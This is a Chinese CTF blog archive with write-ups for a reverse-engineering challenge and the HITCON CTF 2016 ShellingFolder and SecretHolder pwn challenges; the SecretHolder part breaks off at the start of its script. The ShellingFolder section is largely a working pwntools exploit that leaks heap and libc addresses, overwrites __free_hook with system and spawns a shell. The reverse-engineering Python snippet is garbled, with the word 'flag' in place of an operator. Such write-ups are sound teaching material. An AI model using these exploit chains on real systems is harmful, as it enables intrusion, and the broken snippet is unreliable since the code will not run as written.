<h2 id="RE-normal"><a href="#RE-normal" class="headerlink" title="RE normal"></a>RE normal</h2><p>程序将输入分成了几个部分来验证，每一部分验证正确后将这一部分的输入作为xor key来将下一个部分的验证代码还原出来<br>第一部分先将大括号里的前四个字符按位拆成8个字节，然后打了好长的一个表，然后做各种变换，和简单处理过的输入异或，最后和结果比对<br>把打好的表和最后的变换抠出来，拿结果异或回去就行了。。。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> v7[] =</div><div class="line">&#123;</div><div class="line">  <span class="number">0x03</span>, <span class="number">0xCC</span>, <span class="number">0x42</span>, <span class="number">0xDE</span>, <span class="number">0x2F</span>, <span class="number">0x7F</span>, <span class="number">0xF9</span>, <span class="number">0x66</span>, <span class="number">0x23</span>, <span class="number">0x01</span>, </div><div class="line">  <span class="number">0x0B</span>, <span class="number">0x31</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x5B</span>, <span class="number">0x18</span>, <span class="number">0xC5</span>, <span class="number">0xF8</span>, <span class="number">0x45</span>, <span class="number">0xF7</span>, </div><div class="line">  <span class="number">0x73</span>, <span class="number">0xE3</span>, <span class="number">0x6D</span>, <span class="number">0x32</span>, <span class="number">0xB5</span>, <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x7B</span>, <span class="number">0x07</span>, <span class="number">0xC6</span>, </div><div class="line">  <span class="number">0x78</span>, <span class="number">0xFD</span>, <span class="number">0x11</span>, <span class="number">0x19</span>, <span class="number">0x90</span>, <span class="number">0x50</span>, <span class="number">0x00</span>, <span class="number">0x3C</span>, <span class="number">0x08</span>, <span class="number">0x36</span>, </div><div class="line">  <span class="number">0xD4</span>, <span class="number">0x5F</span>, <span class="number">0x8F</span>, <span class="number">0xB1</span>, <span class="number">0x3D</span>, <span class="number">0xCD</span>, <span class="number">0xF6</span>, <span class="number">0x17</span>, <span class="number">0x9C</span>, <span class="number">0xC0</span>, </div><div class="line">  <span class="number">0xB0</span>, <span class="number">0x8D</span>, <span class="number">0x43</span>, <span class="number">0x8E</span>, <span class="number">0x63</span>, <span class="number">0x51</span>, <span class="number">0xE1</span>, <span class="number">0x68</span>, <span class="number">0x29</span>, <span class="number">0x2B</span>, </div><div class="line">  <span class="number">0xDC</span>, <span class="number">0x6B</span>, <span class="number">0xE4</span>, <span class="number">0xC2</span>, <span class="number">0x6A</span>, <span class="number">0x97</span>, <span class="number">0xB6</span>, <span class="number">0x70</span>, <span class="number">0x62</span>, <span class="number">0x3B</span>, </div><div class="line">  <span class="number">0x72</span>, <span class="number">0xEF</span>, <span class="number">0xDF</span>, <span class="number">0x7D</span>, <span class="number">0xC7</span>, <span class="number">0xA4</span>, <span class="number">0x58</span>, <span class="number">0x5A</span>, <span class="number">0xA6</span>, <span class="number">0xEA</span>, </div><div class="line">  <span class="number">0x28</span>, <span class="number">0xB2</span>, <span class="number">0x9D</span>, <span class="number">0x8A</span>, <span class="number">0x7E</span>, <span class="number">0xE7</span>, <span class="number">0x91</span>, <span class="number">0x94</span>, <span class="number">0xC3</span>, <span class="number">0xAA</span>, </div><div class="line">  <span class="number">0xD6</span>, <span class="number">0x48</span>, <span class="number">0xD2</span>, <span class="number">0x92</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0xD5</span>, <span class="number">0xFB</span>, <span class="number">0x14</span>, <span class="number">0xA0</span>, </div><div class="line">  <span class="number">0x0E</span>, <span class="number">0x83</span>, <span class="number">0x47</span>, <span class="number">0xA1</span>, <span class="number">0x3A</span>, <span class="number">0xF0</span>, <span class="number">0xB3</span>, <span class="number">0x09</span>, <span class="number">0x44</span>, <span class="number">0x27</span>, </div><div class="line">  <span class="number">0xB8</span>, <span class="number">0x55</span>, <span class="number">0x8C</span>, <span class="number">0xED</span>, <span class="number">0x8B</span>, <span class="number">0x0A</span>, <span class="number">0x75</span>, <span class="number">0x30</span>, <span class="number">0x38</span>, <span class="number">0x4F</span>, </div><div class="line">  <span class="number">0xC1</span>, <span class="number">0x52</span>, <span class="number">0xC8</span>, <span class="number">0xE2</span>, <span class="number">0xDA</span>, <span class="number">0xAF</span>, <span class="number">0x3E</span>, <span class="number">0x81</span>, <span class="number">0xAC</span>, <span class="number">0xA8</span>, </div><div class="line">  <span class="number">0x20</span>, <span class="number">0xBE</span>, <span class="number">0x7C</span>, <span class="number">0x9E</span>, <span class="number">0xA3</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x06</span>, <span class="number">0x1C</span>, <span class="number">0x99</span>, </div><div class="line">  <span class="number">0xE5</span>, <span class="number">0x49</span>, <span class="number">0x33</span>, <span class="number">0xBD</span>, <span class="number">0x9F</span>, <span class="number">0xD8</span>, <span class="number">0xE0</span>, <span class="number">0x41</span>, <span class="number">0xA5</span>, <span class="number">0x2C</span>, </div><div class="line">  <span class="number">0x05</span>, <span class="number">0xF4</span>, <span class="number">0x35</span>, <span class="number">0x2D</span>, <span class="number">0x89</span>, <span class="number">0x10</span>, <span class="number">0xDB</span>, <span class="number">0x0C</span>, <span class="number">0xAD</span>, <span class="number">0x93</span>, </div><div class="line">  <span class="number">0xEB</span>, <span class="number">0xBC</span>, <span class="number">0x5E</span>, <span class="number">0xFF</span>, <span class="number">0x6F</span>, <span class="number">0xE8</span>, <span class="number">0xC9</span>, <span class="number">0x13</span>, <span class="number">0x82</span>, <span class="number">0x77</span>, </div><div class="line">  <span class="number">0x96</span>, <span class="number">0x3F</span>, <span class="number">0x4C</span>, <span class="number">0xBA</span>, <span class="number">0xB4</span>, <span class="number">0xA2</span>, <span class="number">0xCE</span>, <span class="number">0xDD</span>, <span class="number">0x04</span>, <span class="number">0x4B</span>, </div><div class="line">  <span class="number">0x39</span>, <span class="number">0x2A</span>, <span class="number">0x46</span>, <span class="number">0xCA</span>, <span class="number">0x85</span>, <span class="number">0xFC</span>, <span class="number">0x25</span>, <span class="number">0xA7</span>, <span class="number">0x24</span>, <span class="number">0x57</span>, </div><div class="line">  <span class="number">0x1E</span>, <span class="number">0x1D</span>, <span class="number">0x4A</span>, <span class="number">0x87</span>, <span class="number">0xFA</span>, <span class="number">0x26</span>, <span class="number">0xF5</span>, <span class="number">0x0D</span>, <span class="number">0x12</span>, <span class="number">0x1B</span>, </div><div class="line">  <span class="number">0xAE</span>, <span class="number">0x79</span>, <span class="number">0x67</span>, <span class="number">0xBB</span>, <span class="number">0x21</span>, <span class="number">0x69</span>, <span class="number">0x74</span>, <span class="number">0x84</span>, <span class="number">0x22</span>, <span class="number">0x5C</span>, </div><div class="line">  <span class="number">0x5D</span>, <span class="number">0xEC</span>, <span class="number">0xEE</span>, <span class="number">0x1F</span>, <span class="number">0x37</span>, <span class="number">0xE9</span>, <span class="number">0xF2</span>, <span class="number">0x40</span>, <span class="number">0x86</span>, <span class="number">0xD7</span>, </div><div class="line">  <span class="number">0xF1</span>, <span class="number">0xA9</span>, <span class="number">0xAB</span>, <span class="number">0xD0</span>, <span class="number">0x98</span>, <span class="number">0x64</span>, <span class="number">0xF3</span>, <span class="number">0x9A</span>, <span class="number">0x9B</span>, <span class="number">0x71</span>, </div><div class="line">  <span class="number">0x4D</span>, <span class="number">0x4E</span>, <span class="number">0xB7</span>, <span class="number">0x60</span>, <span class="number">0x95</span>, <span class="number">0xCB</span>, <span class="number">0x02</span>, <span class="number">0x59</span>, <span class="number">0xBF</span>, <span class="number">0xB9</span>, </div><div class="line">  <span class="number">0x88</span>, <span class="number">0xC4</span>, <span class="number">0xCF</span>, <span class="number">0x16</span>, <span class="number">0xD3</span>, <span class="number">0xD1</span>, <span class="number">0xD9</span>, <span class="number">0x80</span>, <span class="number">0x1A</span>, <span class="number">0xFE</span>, </div><div class="line">  <span class="number">0x2E</span>, <span class="number">0x6E</span>, <span class="number">0x56</span>, <span class="number">0x34</span>, <span class="number">0x53</span>, <span class="number">0xE6</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, </div><div class="line">  <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </div><div class="line">  <span class="number">0x00</span>, <span class="number">0x00</span></div><div class="line">&#125;;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> i, j;</div><div class="line">    i = <span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v4, v21, v17, v16;</div><div class="line">    v4 = <span class="number">0</span>;</div><div class="line">    v21 = <span class="number">0</span>;</div><div class="line">    v17 = <span class="number">0</span>;</div><div class="line">    v16 = <span class="number">0</span>;</div><div class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> v8[<span class="number">0x08</span>] = <span class="string">"]\t\x90\x90&amp;/\x01\x8a"</span>;</div><div class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">8</span>; ++j )</div><div class="line">    &#123;</div><div class="line">        i = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(i + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>) + i + <span class="number">1</span>)</div><div class="line">        - ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(i + <span class="number">1</span>) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>);</div><div class="line">        v4 = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)((<span class="keyword">signed</span> <span class="keyword">int</span>)(v21 + (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v7[i]) &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">24</span>;</div><div class="line">        v21 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v4 + v21 + v7[i]) - v4;</div><div class="line">        v17 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v7[i];</div><div class="line">        v7[i] = v7[v21];</div><div class="line">        v7[v21] = v17;</div><div class="line">        v16 = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)v7[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)(v7[i] + v7[v21])];</div><div class="line">        v8[j] ^= v16;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"0x%x "</span>, v8[j]);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">puts</span>(<span class="string">""</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>第二部分将6个字符通过各种位运算和结果作比较，爆破下就好(刚开始自己犯蠢烦了出题人好久，惭愧惭愧)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="comment">#Basic_</span></div><div class="line">input3 = <span class="string">'_'</span></div><div class="line"></div><div class="line">input2_list = []</div><div class="line"><span class="keyword">for</span> c <span class="keyword">in</span> string.printable:</div><div class="line">    <span class="keyword">if</span> ord(<span class="string">'='</span>) == ((<span class="number">4</span> * ord(c)) flag <span class="number">0x3c</span>) + (ord(input3) &gt;&gt; <span class="number">6</span>) + <span class="number">48</span>:</div><div class="line">        input2_list.append(c)</div><div class="line"></div><div class="line"><span class="keyword">print</span> input2_list</div><div class="line"></div><div class="line"><span class="keyword">for</span> fix <span class="keyword">in</span> range(<span class="number">0x10</span>):</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> input2_list:</div><div class="line">        <span class="keyword">if</span> ord(<span class="string">'F'</span>) == ((<span class="number">16</span> * (<span class="number">0x60</span> + fix)) &amp; <span class="number">0x30</span>) + (ord(i) &gt;&gt; <span class="number">4</span>) + <span class="number">48</span>:</div><div class="line">            <span class="keyword">print</span> chr(fix + <span class="number">0x60</span>), i</div></pre></td></tr></table></figure></p>
<p>第三部分坑点来了。。。不知是何原因程序在还原这一段代码时有大概率出错，IDA很难解析出正确的汇编代码，多次尝试后找到了验证逻辑，<br>将输入的字符高4位低4位互换(0x61变成0x16),异或0x11后和结果对比，这一部分没写代码手动解，结果是<code>0f_RE_a</code><br>第四部分和第三部分同样的问题，只是出错概率更大，多次尝试后放弃调试，直接手动还原出代码放到IDA里面分析，发现是输入和常量对比，<br>然后就还原出了整个flag(上一部分最后那个<code>a</code>到这一部分就不对了，而且这一部分的代码还是用这个<code>a</code>异或出来的，略有点神奇)  </p>

      
    </div>
  </div>
</article>

  
    
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2016-11-12
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        HITCON CTF 2016 ShellingFolder
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><blockquote>
<p>link: <a href="/2016/11/12/HITCON-CTF-2016-ShellingFolder/ShellingFolder" title="ShellingFolder">ShellingFolder</a>  </p>
</blockquote>
<h2 id="漏洞-amp-amp-利用"><a href="#漏洞-amp-amp-利用" class="headerlink" title="漏洞 &amp;&amp; 利用"></a>漏洞 &amp;&amp; 利用</h2><p><img src="/HITCON-CTF-2016-ShellingFolder/vul.jpg" alt=""><br>栈上的<code>s</code>只有24个字节，最多可以复制32个字节，刚好覆盖到<code>v3</code>，通过更改<code>v3</code>来达到修改任意地址数据，从而实现任意地址读写<br><code>File-&gt;Size</code>长度为32位有符号整数，而指针长度为64位，所以要注意到寄存器相加时的符号及数据长度问题<br>另外，程序开启<code>RELRO</code>，不能修改<code>GOT</code>，最后利用方法是在修改一个已存在的<code>File</code>为<code>&#39;sh\x00&#39;</code>，将libc中的<code>__free_hook</code>修改为system，<br>效果等同于修改<code>free@got</code>，将修改过的<code>File</code>删除即可<br>这个题是在本机上做的，不知道原题给的libc是不是可以通用<br>不过毕竟是HITCON，一个变量溢出都能玩的这么高端<br>利用脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">NewFile</span><span class="params">(p, size, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'4'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Name of File:'</span>)</div><div class="line">    p.send(name)</div><div class="line">    p.recvuntil(<span class="string">'Size of File:'</span>)</div><div class="line">    p.send(str(size))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">NewFolder</span><span class="params">(p, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'3'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Name of Folder:'</span>)</div><div class="line">    p.send(name)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeDir</span><span class="params">(p, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'2'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a Folder :'</span>)</div><div class="line">    p.send(name)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveFile</span><span class="params">(p, name)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'5'</span>)</div><div class="line">    p.recvuntil(<span class="string">'Choose a Folder or file :'</span>)</div><div class="line">    p.send(name + <span class="string">'\n'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">CalcSize</span><span class="params">(p)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'6'</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ListDir</span><span class="params">(p)</span>:</span></div><div class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</div><div class="line">    p.send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">p = process(<span class="string">'./shellingfolder'</span>)</div><div class="line"></div><div class="line">libc = ELF(<span class="string">'./local.libc'</span>)</div><div class="line"></div><div class="line">raw_input()</div><div class="line"></div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'LeakHeap'</span> * <span class="number">3</span>)</div><div class="line"></div><div class="line">CalcSize(p)</div><div class="line"></div><div class="line">p.recvuntil(<span class="string">'LeakHeap'</span> * <span class="number">3</span>)</div><div class="line">heap_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line">heap_base = heap_addr - <span class="number">0x88</span></div><div class="line"></div><div class="line">leak_addr = heap_base + <span class="number">0x258</span></div><div class="line"></div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'A'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'B'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'C'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'D'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'E'</span> * <span class="number">8</span>)</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'F'</span> * <span class="number">8</span>)</div><div class="line"></div><div class="line">RemoveFile(p, <span class="string">'E'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'C'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'A'</span> * <span class="number">8</span>)<span class="comment">#Now there should be a pointer point to main_arena</span></div><div class="line"></div><div class="line">RemoveFile(p, <span class="string">'B'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'D'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'F'</span> * <span class="number">8</span>)</div><div class="line">RemoveFile(p, <span class="string">'LeakHeap'</span> * <span class="number">3</span>)</div><div class="line"></div><div class="line">log.info(<span class="string">'heap base: '</span> + hex(heap_base))</div><div class="line">log.info(<span class="string">'leak addr: '</span> + hex(leak_addr))</div><div class="line"></div><div class="line">payload1 = <span class="string">''</span></div><div class="line">payload1 += <span class="string">'A'</span> * <span class="number">0x18</span></div><div class="line">payload1 += p64(heap_base + <span class="number">0x20</span>)</div><div class="line"></div><div class="line">payload2 = <span class="string">''</span></div><div class="line">payload2 += <span class="string">'B'</span> * <span class="number">0x18</span></div><div class="line">payload2 += p64(heap_base + <span class="number">0x20</span> + <span class="number">0x04</span>)</div><div class="line"></div><div class="line">NewFile(p, (leak_addr - <span class="number">0x58</span>) &amp; <span class="number">0xffffffff</span>, payload1[:<span class="number">30</span>])</div><div class="line">NewFile(p, leak_addr &gt;&gt; <span class="number">32</span>, payload2[:<span class="number">30</span>])</div><div class="line"></div><div class="line">CalcSize(p)<span class="comment">#Create a fake subfile to leak libc</span></div><div class="line"></div><div class="line">ListDir(p)</div><div class="line"></div><div class="line">p.recvuntil(payload2[:<span class="number">30</span>] + <span class="string">'\n'</span>)</div><div class="line">libc_addr = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"></div><div class="line">libc_base = libc_addr - <span class="number">0x3a3678</span></div><div class="line"></div><div class="line">offset_system = libc.symbols[<span class="string">'system'</span>]</div><div class="line"></div><div class="line">free_hook = libc_base + <span class="number">0x3a57c8</span></div><div class="line">system_addr = libc_base + offset_system</div><div class="line"></div><div class="line">log.info(<span class="string">'libc base: '</span> + hex(libc_base))</div><div class="line">log.info(<span class="string">'system addr: '</span> + hex(system_addr))</div><div class="line">log.info(<span class="string">'free_hook addr: '</span> + hex(free_hook))</div><div class="line"></div><div class="line">ListDir(p)</div><div class="line"></div><div class="line">NewFolder(p, <span class="string">'DirToWriteFreeHook'</span>)</div><div class="line">ChangeDir(p, <span class="string">'DirToWriteFreeHook'</span>)</div><div class="line"></div><div class="line">payload1 = <span class="string">''</span></div><div class="line">payload1 += <span class="string">'A'</span> * <span class="number">0x18</span></div><div class="line">payload1 += p64(free_hook)</div><div class="line"></div><div class="line">payload2 = <span class="string">''</span></div><div class="line">payload2 += <span class="string">'B'</span> * <span class="number">0x18</span></div><div class="line">payload2 += p64(free_hook + <span class="number">0x04</span>)</div><div class="line"></div><div class="line">NewFile(p, system_addr &amp; <span class="number">0xffffffff</span>, payload1[:<span class="number">30</span>])</div><div class="line">NewFile(p, system_addr &gt;&gt; <span class="number">32</span>, payload2[:<span class="number">30</span>])</div><div class="line"></div><div class="line">CalcSize(p)<span class="comment">#write __free_hook</span></div><div class="line"></div><div class="line">NewFolder(p, <span class="string">'DirToWriteSh'</span>)</div><div class="line">ChangeDir(p, <span class="string">'DirToWriteSh\n'</span>)</div><div class="line"></div><div class="line">ListDir(p)</div><div class="line"></div><div class="line">sh = <span class="number">0x3b6873</span></div><div class="line"></div><div class="line">payload1 = <span class="string">''</span></div><div class="line">payload1 += <span class="string">'A'</span> * <span class="number">0x18</span></div><div class="line">payload1 += p64(heap_base + <span class="number">0x490</span>)</div><div class="line"></div><div class="line">NewFile(p, sh, payload1[:<span class="number">30</span>])</div><div class="line">NewFile(p, <span class="number">0</span>, <span class="string">'FileToPutSh\x00'</span>)</div><div class="line"></div><div class="line">CalcSize(p)<span class="comment">#write 'sh;\x00'</span></div><div class="line"></div><div class="line">RemoveFile(p, <span class="string">'FileToPutSh\x00'</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>

      
    </div>
  </div>
</article>

  
    
    
    <article class="archive-article archive-type-post">
  <div class="archive-article-inner">
    <header class="archive-article-header">
      <div class="meta">
  
      <span class="date">
          2016-10-14
      </span>
  

  

  


</div>

      
    
      <h1 itemprop="name">
        HITCON CTF 2016 SerectHolder
      </h1>
    
  

    </header>

    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><blockquote>
<p>link: <a href="/2016/10/14/HITCON-CTF-2016-SerectHolder/SecretHolder" title="SecretHolder">SecretHolder</a>  </p>
</blockquote>
<p>程序可以申请大小分别为40， 4000， 400000的堆块，并有删除，编辑操作  </p>
<h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><p>比赛期间只发现一个double free<br><img src="HITCON-CTF-2016-SerectHolder/HITCON2016_SH_VUL.png" alt=""><br>因为可以申请一个fast chunk和big chunk,应该就是考察fast chunk在特定情况下(申请大的堆块，fastbin非空)会合并的特点，<br>但是比赛时一直没有找到利用的方法，<br>比赛后参考国外队伍的writeup，分别申请huge chunk和small chunk,再free掉，然后再申请huge chunk，这样便可以另huge chunk落入top chunk中，<br>然后free已经被free掉的small chunk，然后再申请，便可以令small chunk落入huge chunk中(后面的big chunk也会落入huge chunk中，原理未知)，<br>造成堆块的重叠，之后便是unlink的利用了  </p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>脚本如下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div 